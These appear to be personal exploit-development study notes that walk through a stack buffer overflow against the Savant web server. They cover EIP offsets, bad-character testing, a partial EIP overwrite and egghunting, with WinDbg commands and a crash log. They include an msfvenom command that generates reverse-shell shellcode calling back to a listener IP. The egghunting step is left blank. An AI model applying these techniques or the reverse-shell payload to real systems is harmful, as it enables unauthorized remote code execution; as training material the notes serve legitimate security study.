# Egghunting

## Steps to Execute a Buffer Overflow Attack

1. **Start by Building a Script that Causes a Crash**
    - Create a script in the desired language (e.g., Python) to send input to the vulnerable application and observe if it crashes. This is the initial step to confirm that the application is indeed vulnerable.

2. **Find EIP Location**
    - Use Metasploit Framework (msf) to create and find patterns.
        - `msf-pattern_create -l <length>`: Generates a unique pattern of a specified length.
        - `msf-pattern_offset -l <length> -q <EIP>`: Finds the offset of the EIP within the pattern.
        - If this is not working due to causing a different crash or partial overwrite. we can try to manually find it by sending A B C combinations.

3. **Check for Bad Characters**
    - Identify characters that might cause issues within the shellcode. Bad characters can interrupt the execution of the payload.
    - Test in chunks if necessary.
    - Example bad characters list:
      ```python
      badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
      )
      ```
    - Windbg command to check bad characters:
        - `db esp -10 L20`: Dump 20 bytes before the ESP.
        - Be cautious of bytes that might not break other bytes but can break themselves.
        - Another case of this might be that it simply causes a different crash or it won't crash at all. In those cases do as we did before and loop through/cut in half.

4. **Partial EIP overwrite**
    - In cases where the only module available to use to use has a bad characters (null) in what i believe will be most cases. we can hopefully attempt to abuse the fact that our payload is a string. we can check this by viewing our eip register and checking if it is null terminated by default:
    - `ddes @esp L4`
    - If our payload is null terminated, we can attempt to overwrite our eip partially and having it complete the overwrite with the null byte.
    - Essentially if we send in 3 instead of 4 bytes in the eip, it will complete us and overwrite that last byte and now we can get code execution in the module that starts with a null byte.
    - ```
      (5dc.14b8): Break instruction exception - code 80000003 (first chance)
      *** WARNING: Unable to verify checksum for C:\Savant\Savant.exe
      *** ERROR: Module load completed but symbols could not be loaded for C:\Savant\Savant.exe
      eax=00000000 ebx=003d56d0 ecx=0000000e edx=77eb4550 esi=003d56d0 edi=0041703c
      eip=00424242 esp=02efea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc
      cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
      Savant+0x24242:
      00424242 cc              int     3
      ```
    - This however means that we cannot use anybytes after our payload.

5. **Bypassing space limitations**
    - In the Savant application we needed to bypass the HTTP issue. This is because we will be using a POP R32 RET to go back to the begenning of our shellcode because we want to remove the first DWORD and the second DWORD is where our shellcode is. The issue is that there is an HTTP request ahead of it.
    - So to do all this you can follow something similar to the following:
    - `dds @esp L5`
    - `dc poi(@esp+x04)`
    - `u poi(@esp+0x04)`
    - After the `u` command we are able to see if the instructions are anything that can cause us trouble. In the case of Savant we need to bypass add instructions that add to eax, but we don't have an eax. To work this out we will find a pop eax, ret combo.
    -  We can do this by using msf-nasm_shell `pop eax` `ret` and searching those values in the module:
    -  `s-[1]b 00400000 0452000 58 c3`
    -  pack the pop eax; ret
    -  `pack("<L", (0x418674))`
    -  In normal circumstances we would have some level of control but in this case we still have to deal with the http methods. when things like a jmp wont work with `eb17` we can try conditional jumps.
    -  the idea is we use `je 17`. so we'll do this by `xor ecx, ecx`, `test ecx, ecx`, `je 0x17`. Note: 17 is the amound of bytes it takes to reach our A's.
    -  At this point we have control of our buffer, but it's still not enough space. In our case we can calculate this space by doing `db @eip L100`, grabbing the final eip register and subtracting by the first register. This will show us 251.
    -  We can simply add this data after the first return:
    -  ```
       httpEndRequest = b"\r\n"
       httpEndRequest+= b"w00tw00t" + b"\x44" * 400
       httpEndRequest+= b"\r\n\r\n"
       ```
     - However in this application this will not work. So we can try to add it afterwords all together: `buf = httpMethod + inputBuffer +  httpEndRequest + shellcode`
     - We can then search for it: `s -a 0x0 L?80000000 w00tw00t`
     - Once we find the address of our stack we need to ensure that it has all of our shellcode. when we are sure of that we can check where this address exists.
     - An easy way to do that is by `!teb` which will show us if it is in OUR stack. If not we can look for it using `!address [address]`
     - This is where we use egghunter!
  
6. **Egghunting**
     - `pip install keystone-engine` Start by installing keystone
     - 


7. **Generate Shellcode**
    - Use msfvenom to generate the shellcode for a reverse TCP shell:
        ```bash
        msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.237 LPORT=443 EXITFUNC=thread -f python -v shellcode –e x86/shikata_ga_nai -b "\x00"
        ```
    - Ensure the shellcode does not contain bad characters and is encoded appropriately.

8. **Don’t Forget NOP Sled**
    - Include NOP (No Operation) instructions to increase the reliability of the shellcode execution.
    - Typically, a series of 0x90 bytes (NOPs) are added before the shellcode to create a "NOP sled."
